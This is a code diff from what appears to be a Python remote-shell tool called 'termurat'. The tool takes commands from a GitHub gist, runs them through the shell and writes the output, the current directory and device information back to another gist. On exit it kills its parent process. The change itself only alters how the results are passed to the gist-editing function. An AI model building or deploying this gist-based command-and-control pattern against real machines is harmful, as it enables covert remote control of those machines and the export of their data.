@@ -68,13 +68,13 @@ while True:
             pwd = out.pop(-1)
             out = "\n".join(out)
     elif command == "termurat exit":
-        edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
+        edit_gist(data["to_host_gist_id"], "to_host.json", {
             "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
             "pwd": pwd,
             "deviceinfo": dev_inf,
             "command": command,
             "info": "Done"
-        }))
+        })
         time.sleep(5)
         parent_pid = os.getppid()
         os.kill(parent_pid, signal.SIGHUP)
@@ -97,13 +97,13 @@ while True:
         run(f"cd {pwd} && rm temp.jpg", shell=True)
         
 
-        edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
+        edit_gist(data["to_host_gist_id"], "to_host.json", {
         "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
         "pwd": pwd,
         "deviceinfo": dev_inf,
         "command": command,
         "info": out
-    }))
+    })
         continue
     else:
         out = output(f"cd {pwd} && {command} && echo {separator} && pwd")
@@ -114,10 +114,10 @@ while True:
         if not out: 
             out = "Done"
 
-    edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
+    edit_gist(data["to_host_gist_id"], "to_host.json", {
         "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
         "pwd": pwd,
         "deviceinfo": dev_inf,
         "command": command,
         "info": out
-    }))
+    })
